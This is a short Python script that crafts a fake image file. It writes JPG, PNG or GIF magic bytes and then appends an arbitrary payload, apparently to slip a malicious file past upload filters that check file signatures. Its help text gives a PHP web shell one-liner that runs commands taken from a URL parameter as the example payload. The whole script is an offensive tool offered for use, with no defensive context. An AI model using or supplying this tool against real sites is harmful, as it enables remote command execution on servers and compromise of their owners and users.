import argparse
import random
import string
import struct
import sys
from termcolor import colored

if __name__ == "__main__":
	
	#parsing command line arguments
	parser = argparse.ArgumentParser()
	parser.add_argument("-e", "--extension", type=str, default="png", help="specify the extenstion to use, must be jpg/png/gif")
	parser.add_argument("-p", "--payload", type=str, required=True, help="specify the payload to use, e.g. '<?php system($_GET[\'c\']); ?>'")
	parser.add_argument("-f", "--filename", type=str, help="specify a filename to use")
	args = parser.parse_args()
	extension = args.extension

	#validating extension type
	if extension not in ["jpg", "png", "gif"]:
		print("[-] Extension must be png/jpg/gif")
		sys.exit(1)

	payload = args.payload

	#parsing output file name
	if args.filename != None:
		filename = args.filename
	else:
		filename = "".join(random.choice(string.ascii_letters) for _ in range(10)) 

	#magic bytes declaration
	magic_bytes = {
		"jpg": [0xFF, 0xD8, 0xFF, 0xE0],
		"png": [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52],
		"gif": [0x47, 0x49, 0x46, 0x38]
	}

	#cooking the file :)
	with open(f"{filename}.{extension}", "wb") as wf:
		mbytes = magic_bytes[extension]
		for byte in mbytes:
			wf.write(struct.pack("B", byte))
		wf.write(payload.encode())
	
	print(colored(f"File saved as {filename}.{extension}.", "green"))